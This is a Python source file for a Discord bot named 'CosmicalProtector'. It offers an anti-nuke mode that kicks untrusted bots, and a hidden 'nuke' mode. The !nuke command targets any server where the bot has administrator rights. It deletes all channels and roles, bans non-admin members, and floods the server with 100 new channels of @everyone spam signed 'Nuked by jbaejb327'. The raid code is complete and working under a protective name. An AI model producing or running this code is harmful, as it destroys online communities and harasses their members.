import discord
from discord.ext import commands
import asyncio
import time

intents = discord.Intents.default()
intents.members = True
intents.message_content = True
intents.guilds = True

bot = commands.Bot(command_prefix='!', intents=intents)
bot.current_mode = 'anti-nuke'

YOUR_USER_ID = 1035963563740762112
TRUSTED_BOT_IDS = {161660517914509312, 651095740390834176, 235148962103951360, 678344927997853742}
UNNUKABLE_SERVER_IDS = {1305135842863484938}

@bot.event
async def on_ready():
    print(f'CosmicalProtector online as {bot.user}! Current mode: {bot.current_mode}')

@bot.command()
@commands.has_permissions(administrator=True)
async def set_mode(ctx, mode: str):
    mode = mode.lower()
    if mode not in ['anti-nuke', 'nuke']:
        if ctx.author.id == YOUR_USER_ID:
            try:
                await ctx.author.send("Invalid mode. Use 'anti-nuke' or 'nuke'.")
            except Exception:
                pass
        return

    bot.current_mode = mode
    await ctx.send(f"Mode switched to {mode}.")
    print(f"Mode switched to {mode} by {ctx.author}")

async def anti_nuke_check(guild, action_type):
    async for entry in guild.audit_logs(action=action_type, limit=1):
        user = entry.user
        if user.bot and user.id not in TRUSTED_BOT_IDS:
            try:
                if guild.system_channel:
                    await guild.system_channel.send(f"🚨 Untrusted bot {user.name} attempted {action_type.name}! Kicking...")
                await user.kick(reason="Anti-nuke defense")
                print(f"Kicked untrusted bot {user.name} for {action_type.name}")
            except Exception as e:
                print(f"Failed to kick untrusted bot {user.name}: {e}")

@bot.event
async def on_guild_channel_delete(channel):
    if bot.current_mode == 'anti-nuke':
        await anti_nuke_check(channel.guild, discord.AuditLogAction.channel_delete)

@bot.event
async def on_guild_role_delete(role):
    if bot.current_mode == 'anti-nuke':
        await anti_nuke_check(role.guild, discord.AuditLogAction.role_delete)

@bot.event
async def on_member_ban(guild, user):
    if bot.current_mode == 'anti-nuke':
        async for entry in guild.audit_logs(action=discord.AuditLogAction.ban, limit=1):
            executor = entry.user
            if executor.bot and executor.id not in TRUSTED_BOT_IDS:
                try:
                    if guild.system_channel:
                        await guild.system_channel.send(f"🚨 Untrusted bot {executor.name} banned {user.name}! Kicking executor...")
                    await executor.kick(reason="Anti-nuke defense")
                    print(f"Kicked untrusted bot {executor.name} for banning {user.name}")
                except Exception as e:
                    print(f"Failed to kick untrusted bot {executor.name}: {e}")

@bot.command()
@commands.has_permissions(administrator=True)
async def nuke(ctx, server_id: int):
    if bot.current_mode != 'nuke':
        if ctx.author.id == YOUR_USER_ID:
            try:
                await ctx.author.send("Nuke mode is not active! Switch mode to 'nuke' first.")
            except Exception:
                pass
        return

    if server_id in UNNUKABLE_SERVER_IDS:
        await ctx.send("This server is protected and cannot be nuked by this bot.")
        return

    guild = bot.get_guild(server_id)
    if guild is None:
        await ctx.send("Invalid server ID.")
        return

    if not guild.me.guild_permissions.administrator:
        await ctx.send("I need administrator permissions in that server to nuke it.")
        return

    await ctx.send(f"Starting nuke on server: {guild.name}")

    # Delete channels
    for channel in guild.channels:
        try:
            await channel.delete()
            await asyncio.sleep(1)
        except Exception as e:
            print(f"Failed to delete channel {channel.name}: {e}")

    # Delete roles
    for role in guild.roles:
        if role.name != '@everyone' and role < guild.me.top_role:
            try:
                await role.delete()
                await asyncio.sleep(1)
            except Exception as e:
                print(f"Failed to delete role {role.name}: {e}")

    # Ban members
    for member in guild.members:
        if member.id != bot.user.id and not member.guild_permissions.administrator:
            try:
                await member.ban(reason='Nuked by jbaejb327')
                await asyncio.sleep(1)
            except Exception as e:
                print(f"Failed to ban member {member.name}: {e}")

    for _ in range(100):
        try:
            new_channel = await guild.create_text_channel('nuked-by-jbaejb327')
            for _ in range(10):
                await new_channel.send('||@everyone|| Nuked by jbaejb327 (555 member) ||@everyone||')
                await asyncio.sleep(0.5)
        except Exception as e:
            print(f"Failed to create/spam channel: {e}")

    await ctx.send(f"Server {guild.name} nuked!")

bot.run('nuhuh-no-token-for-you')